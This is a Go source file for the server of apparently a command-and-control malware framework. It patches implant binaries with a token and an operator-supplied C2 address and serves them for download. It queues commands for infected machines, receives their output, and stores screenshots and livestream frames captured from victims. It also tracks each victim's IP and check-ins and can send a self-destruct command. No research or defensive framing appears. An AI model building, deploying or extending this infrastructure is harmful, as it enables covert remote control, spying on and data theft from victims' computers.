package controllers

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"awesomeProject/config"
	"awesomeProject/database"
	"awesomeProject/models"

	"github.com/gin-gonic/gin"
)

const (
	tokenPlaceholder = "deadbeef-0000-0000-0000-000000000000"
	c2Placeholder    = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"

	baseClientWindowsRel = "binaries/base_client_windows.exe"
	baseClientLinuxRel   = "binaries/base_client_linux"
	baseClientRel        = "binaries/base_client"
)

var (
	baseClientWindowsPath string
	baseClientLinuxPath   string
	baseClientPathOld     string
)

func init() {
	wd, err := os.Getwd()
	if err != nil {
		panic(fmt.Sprintf("CRITICAL ERROR: Failed to get working directory: %v", err))
	}

	baseClientWindowsPath = filepath.Join(wd, baseClientWindowsRel)
	if _, err := os.Stat(baseClientWindowsPath); os.IsNotExist(err) {
		fmt.Printf("WARNING: Windows base binary not found at: '%s'. This must exist for implant generation.\n", baseClientWindowsPath)
	}

	baseClientLinuxPath = filepath.Join(wd, baseClientLinuxRel)
	if _, err := os.Stat(baseClientLinuxPath); os.IsNotExist(err) {
		fmt.Printf("WARNING: Linux base binary not found at: '%s'. This must exist for implant generation.\n", baseClientLinuxPath)
	}

	baseClientPathOld = filepath.Join(wd, baseClientRel)

	fmt.Printf("CONTROLLER.init: Base paths configured. Windows: %s, Linux: %s\n", baseClientWindowsPath, baseClientLinuxPath)
}

func saveLivestreamFrameToFile(implantToken string, base64Data string) (string, error) {
	imgBytes, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64 image data: %w", err)
	}

	screenshotsBaseDir := "c2_screenshots"
	implantScreenshotsDir := filepath.Join(screenshotsBaseDir, implantToken)

	if err := os.MkdirAll(implantScreenshotsDir, 0750); err != nil {
		return "", fmt.Errorf("failed to create screenshot directory '%s': %w", implantScreenshotsDir, err)
	}

	filename := fmt.Sprintf("livestream_frame_%d.png", time.Now().UnixNano())
	filePath := filepath.Join(implantScreenshotsDir, filename)

	if err := os.WriteFile(filePath, imgBytes, 0640); err != nil {
		return "", fmt.Errorf("failed to write screenshot to file '%s': %w", filePath, err)
	}

	urlPath := filepath.ToSlash(filePath)
	fmt.Printf("Livestream Frame saved: %s (Implant: %s)\n", urlPath, implantToken)
	return urlPath, nil
}

func HandleLivestreamFrame(c *gin.Context) {
	var req struct {
		ImplantID string `json:"implant_id"`
		FrameData string `json:"frame_data"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid livestream frame payload: " + err.Error()})
		return
	}

	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", req.ImplantID).First(&imp).Error; err == nil {
		imp.LastSeen = time.Now()
		imp.Status = "online"
		if errDbSave := config.DB.Save(&imp).Error; errDbSave != nil {
			fmt.Printf("HandleLivestreamFrame: Error updating implant %s last_seen/status: %v\n", req.ImplantID, errDbSave)
		}
	} else {
		fmt.Printf("HandleLivestreamFrame: Implant %s not found in DB. Frame processed but status not updated.\n", req.ImplantID)
	}

	_, err := saveLivestreamFrameToFile(req.ImplantID, req.FrameData)
	if err != nil {
		errMsg := fmt.Sprintf("Livestream frame received for implant %s, but failed to save: %v. Data length: %d bytes.", req.ImplantID, err, len(req.FrameData))
		fmt.Println(errMsg)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save livestream frame"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Livestream frame received"})
}

func GetScreenshotsForImplant(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implantUniqueToken := c.Param("implant_id")

	var implant models.Implant
	if err := config.DB.Where("unique_token = ? AND user_id = ?", implantUniqueToken, userID).First(&implant).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}

	screenshotInfoMap := make(map[string]models.ScreenshotInfo)

	var commands []models.Command
	config.DB.Where("implant_id = ? AND command = ? AND status = ?", implantUniqueToken, "screenshot", "executed").
		Order("updated_at DESC").
		Find(&commands)

	for _, cmd := range commands {
		prefix := "Screenshot saved to C2 server at: "
		if strings.HasPrefix(cmd.Output, prefix) {
			urlPath := strings.TrimSpace(strings.TrimPrefix(cmd.Output, prefix))
			expectedPrefix := filepath.ToSlash(filepath.Join("c2_screenshots", implantUniqueToken)) + "/"
			if urlPath != "" && strings.HasSuffix(urlPath, ".png") && strings.HasPrefix(urlPath, expectedPrefix) {
				filename := filepath.Base(urlPath)
				screenshotInfoMap[urlPath] = models.ScreenshotInfo{
					CommandID: cmd.ID,
					Timestamp: cmd.UpdatedAt,
					URLPath:   urlPath,
					Filename:  filename,
				}
			}
		}
	}

	implantScreenshotsDir := filepath.Join("c2_screenshots", implantUniqueToken)
	files, err := os.ReadDir(implantScreenshotsDir)

	if err == nil {
		for _, file := range files {
			if file.IsDir() || !strings.HasSuffix(strings.ToLower(file.Name()), ".png") {
				continue
			}

			urlPath := filepath.ToSlash(filepath.Join("c2_screenshots", implantUniqueToken, file.Name()))

			existingInfo, entryExists := screenshotInfoMap[urlPath]

			var timestamp time.Time
			fileInfo, statErr := file.Info()
			if statErr == nil {
				timestamp = fileInfo.ModTime()
			} else {
				timestamp = time.Now()
				fmt.Printf("Warning: Could not stat file %s for implant %s: %v\n", file.Name(), implantUniqueToken, statErr)
			}

			fn := file.Name()
			if strings.HasPrefix(fn, "livestream_frame_") && strings.HasSuffix(fn, ".png") {
				tsStr := strings.TrimSuffix(strings.TrimPrefix(fn, "livestream_frame_"), ".png")
				if tsInt, parseErr := strconv.ParseInt(tsStr, 10, 64); parseErr == nil {
					timestamp = time.Unix(0, tsInt)
				}
			} else if strings.HasPrefix(fn, "screenshot_cmd") && strings.HasSuffix(fn, ".png") {
				parts := strings.Split(strings.TrimSuffix(fn, ".png"), "_")
				if len(parts) >= 3 {
					if tsInt, parseErr := strconv.ParseInt(parts[len(parts)-1], 10, 64); parseErr == nil {
						timestamp = time.Unix(0, tsInt)
					}
				}
			}

			if entryExists {
				existingInfo.Timestamp = timestamp
				screenshotInfoMap[urlPath] = existingInfo
			} else {
				screenshotInfoMap[urlPath] = models.ScreenshotInfo{
					Timestamp: timestamp,
					URLPath:   urlPath,
					Filename:  file.Name(),
				}
			}
		}
	} else if !os.IsNotExist(err) {
		fmt.Printf("Error reading screenshot directory %s for implant %s: %v\n", implantScreenshotsDir, implantUniqueToken, err)
	}

	var allScreenshotInfos []models.ScreenshotInfo
	for _, info := range screenshotInfoMap {
		allScreenshotInfos = append(allScreenshotInfos, info)
	}

	sort.Slice(allScreenshotInfos, func(i, j int) bool {
		return allScreenshotInfos[i].Timestamp.After(allScreenshotInfos[j].Timestamp)
	})

	fmt.Printf("Found %d screenshots for implant %s (DB commands + FS scan).\n", len(allScreenshotInfos), implantUniqueToken)
	c.JSON(http.StatusOK, gin.H{"screenshots": allScreenshotInfos})
}

func saveScreenshotToFile(implantToken string, commandID int, base64Data string) (string, error) {
	imgBytes, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64 image data: %w", err)
	}

	screenshotsBaseDir := "c2_screenshots"
	implantScreenshotsDir := filepath.Join(screenshotsBaseDir, implantToken)

	if err := os.MkdirAll(implantScreenshotsDir, 0750); err != nil {
		return "", fmt.Errorf("failed to create screenshot directory '%s': %w", implantScreenshotsDir, err)
	}

	filename := fmt.Sprintf("screenshot_cmd%d_%d.png", commandID, time.Now().UnixNano())
	filePath := filepath.Join(implantScreenshotsDir, filename)

	if err := os.WriteFile(filePath, imgBytes, 0640); err != nil {
		return "", fmt.Errorf("failed to write screenshot to file '%s': %w", filePath, err)
	}

	absFilePath, _ := filepath.Abs(filePath)
	fmt.Printf("Screenshot saved: %s (Implant: %s, CommandID: %d)\n", absFilePath, implantToken, commandID)
	return filePath, nil
}

func HandleCommandResult(c *gin.Context) {
	var req struct {
		CommandID int    `json:"command_id"`
		Output    string `json:"output"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload: " + err.Error()})
		return
	}

	var cmd models.Command
	if err := config.DB.First(&cmd, req.CommandID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Command not found"})
		return
	}

	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", cmd.ImplantID).First(&imp).Error; err == nil {
		imp.LastSeen = time.Now()
		imp.Status = "online"
		if errDbSave := config.DB.Save(&imp).Error; errDbSave != nil {
			fmt.Printf("HandleCommandResult: Error updating implant %s last_seen/status: %v\n", cmd.ImplantID, errDbSave)
		}
	} else {
		fmt.Printf("HandleCommandResult: Warning - Could not find implant %s to update last_seen/status.\n", cmd.ImplantID)
	}

	outputToStoreInDB := req.Output

	if cmd.Command == "screenshot" && strings.HasPrefix(req.Output, "screenshot_data:") {
		base64ImageData := strings.TrimPrefix(req.Output, "screenshot_data:")

		savedPath, err := saveScreenshotToFile(cmd.ImplantID, cmd.ID, base64ImageData)
		if err != nil {
			errMsg := fmt.Sprintf("Screenshot received for command %d (implant %s), but failed to save: %v. Data length: %d bytes.", cmd.ID, cmd.ImplantID, err, len(base64ImageData))
			fmt.Println(errMsg)
			outputToStoreInDB = errMsg
		} else {
			successMsg := fmt.Sprintf("Screenshot saved to C2 server at: %s", savedPath)
			fmt.Printf("Screenshot for command %d (implant %s) successfully processed. DB Msg: %s\n", cmd.ID, cmd.ImplantID, successMsg)
			outputToStoreInDB = successMsg
		}
	}
	if err := database.MarkCommandAsExecuted(req.CommandID, outputToStoreInDB); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status and output in DB"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Command result received and processed"})
}

func GenerateImplant(c *gin.Context) {
	userIfc, _ := c.Get("user_id")
	userID := userIfc.(int)

	var req struct {
		TargetOS string `json:"target_os" binding:"required,oneof=windows linux"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux) is required. " + err.Error()})
		return
	}

	imp, err := database.CreateImplant(userID, req.TargetOS)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant record"})
		return
	}
	c.JSON(http.StatusCreated, gin.H{"message": "Implant record generated for " + req.TargetOS, "implant": imp})
}

func DownloadConfiguredImplant(c *gin.Context) {
	implantDBUniqueToken := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)

	var req struct {
		C2IP string `json:"c2_ip" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload: 'c2_ip' is required. " + err.Error()})
		return
	}

	implant, err := database.GetImplantByToken(userID, implantDBUniqueToken)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}

	var selectedBinaryPath string
	var outputFilename string

	if implant.TargetOS == "windows" {
		selectedBinaryPath = baseClientWindowsPath
		outputFilename = fmt.Sprintf("implant_%s_windows.exe", implantDBUniqueToken)
	} else if implant.TargetOS == "linux" {
		selectedBinaryPath = baseClientLinuxPath
		outputFilename = fmt.Sprintf("implant_%s_linux", implantDBUniqueToken)
	} else {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Implant has an invalid target OS."})
		return
	}
	if _, err := os.Stat(selectedBinaryPath); os.IsNotExist(err) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("Base binary for %s not found on server at %s", implant.TargetOS, selectedBinaryPath)})
		return
	}

	baseBinaryData, err := os.ReadFile(selectedBinaryPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read base client binary: " + err.Error()})
		return
	}

	patchedData := make([]byte, len(baseBinaryData))
	copy(patchedData, baseBinaryData)

	tokenIdx := bytes.LastIndex(patchedData, []byte(tokenPlaceholder))
	if tokenIdx == -1 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Token placeholder not found in base client binary."})
		return
	}
	if len(implantDBUniqueToken) > len(tokenPlaceholder) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: Implant ID too long for patching."})
		return
	}
	paddedToken := make([]byte, len(tokenPlaceholder))
	copy(
		paddedToken,
		[]byte(implantDBUniqueToken),
	)
	copy(patchedData[tokenIdx:], paddedToken)

	c2Idx := bytes.LastIndex(patchedData, []byte(c2Placeholder))
	if c2Idx == -1 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "C2 IP placeholder not found in base client binary."})
		return
	}
	c2IPBytes := []byte(req.C2IP)
	if len(c2IPBytes) > len(c2Placeholder) {
		errorMsg := fmt.Sprintf("C2 IP is too long. Max length: %d, Got: %d", len(c2Placeholder), len(c2IPBytes))
		c.JSON(http.StatusBadRequest, gin.H{"error": errorMsg})
		return
	}
	paddedC2IP := make([]byte, len(c2Placeholder))
	copy(paddedC2IP, c2IPBytes)
	copy(patchedData[c2Idx:], paddedC2IP)

	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outputFilename))
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", patchedData)
}

func GetUserImplants(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implants, err := database.GetImplantsByUserID(userID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch implants"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implants": implants})
}

func SendCommand(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	var req struct {
		ImplantID string `json:"implant_id"`
		Command   string `json:"command"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}
	imp, err := database.GetImplantByID(req.ImplantID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}
	if imp.UserID != userID {
		c.JSON(http.StatusForbidden, gin.H{"error": "You do not own this implant"})
		return
	}
	cmd := models.Command{
		ImplantID: req.ImplantID,
		Command:   req.Command,
		Status:    "pending",
	}
	if err := config.DB.Create(&cmd).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create command"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Command sent successfully", "command_id": cmd.ID})
}

func ImplantClientFetchCommands(c *gin.Context) {
	implantUniqueToken := c.Param("unique_token")
	if implantUniqueToken == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant unique token is required"})
		return
	}
	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", implantUniqueToken).First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}
	imp.LastSeen = time.Now()
	imp.Status = "online"
	clientIP := c.ClientIP()
	if clientIP != "" && imp.IPAddress != clientIP {
		imp.IPAddress = clientIP
	}
	if err := config.DB.Save(&imp).Error; err != nil {
		fmt.Printf("ImplantClientFetchCommands: Error updating implant %s: %v\n", implantUniqueToken, err)
	}
	cmds, err := database.GetPendingCommandsForImplant(implantUniqueToken)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch pending commands"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}

func DashboardGetCommandsForImplant(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implantUniqueToken := c.Param("implant_id")
	if implantUniqueToken == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID (unique_token) is required"})
		return
	}
	var implant models.Implant
	if err := config.DB.Where("unique_token = ? AND user_id = ?", implantUniqueToken, userID).First(&implant).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}
	cmds, err := database.GetCommandsByImplantID(implantUniqueToken)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands for implant"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}

func CheckinImplant(c *gin.Context) {
	var req struct {
		ImplantID string `json:"implant_id"`
		IPAddress string `json:"ip_address"`
		PWD       string `json:"pwd"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload for check-in: " + err.Error()})
		return
	}
	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", req.ImplantID).First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found during check-in"})
		return
	}
	imp.Status = "online"
	imp.Deployed = true
	if req.IPAddress != "" {
		imp.IPAddress = req.IPAddress
	} else {
		imp.IPAddress = c.ClientIP()
	}
	imp.LastSeen = time.Now()
	if err := config.DB.Save(&imp).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update implant on check-in"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Check-in successful"})
}

func DeleteImplant(c *gin.Context) {
	implantUniqueToken := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)
	var imp models.Implant
	if err := config.DB.Where("unique_token = ? AND user_id = ?", implantUniqueToken, userID).First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}

	if imp.Status == "online" {
		selfDestructCmd := models.Command{
			ImplantID: imp.UniqueToken,
			Command:   "self_destruct",
			Status:    "pending",
		}
		if err := config.DB.Create(&selfDestructCmd).Error; err != nil {
			fmt.Printf("Warning: Failed to send self-destruct command to implant %s: %v\n", imp.UniqueToken, err)
		} else {
			fmt.Printf("Self-destruct command sent to implant %s before deletion\n", imp.UniqueToken)
		}
	}

	if err := config.DB.Where("implant_id = ?", imp.UniqueToken).Delete(&models.Command{}).Error; err != nil {
		fmt.Printf("Warning: Failed to delete commands for implant %s: %v\n", imp.UniqueToken, err)
	}
	if err := config.DB.Delete(&imp).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to delete implant"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Implant and associated commands deleted successfully"})
}
func DownloadImplant(c *gin.Context) {
	implantDBUniqueToken := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)

	_, err := database.GetImplantByToken(userID, implantDBUniqueToken)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}
	if _, err := os.Stat(baseClientPathOld); os.IsNotExist(err) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("Legacy base binary not found on server at %s", baseClientPathOld)})
		return
	}
	baseBinaryData, err := os.ReadFile(baseClientPathOld)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read (legacy) base client binary: " + err.Error()})
		return
	}

	patchedData := make([]byte, len(baseBinaryData))
	copy(patchedData, baseBinaryData)

	idx := bytes.LastIndex(patchedData, []byte(tokenPlaceholder))
	if idx == -1 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Placeholder not found in (legacy) base client binary."})
		return
	}
	if len(implantDBUniqueToken) > len(tokenPlaceholder) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: ID too long for (legacy) patching."})
		return
	}
	paddedToken := make([]byte, len(tokenPlaceholder))
	copy(paddedToken, []byte(implantDBUniqueToken))
	copy(patchedData[idx:], paddedToken)

	outName := fmt.Sprintf("implant_legacy_%s.bin", implantDBUniqueToken)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", patchedData)
}
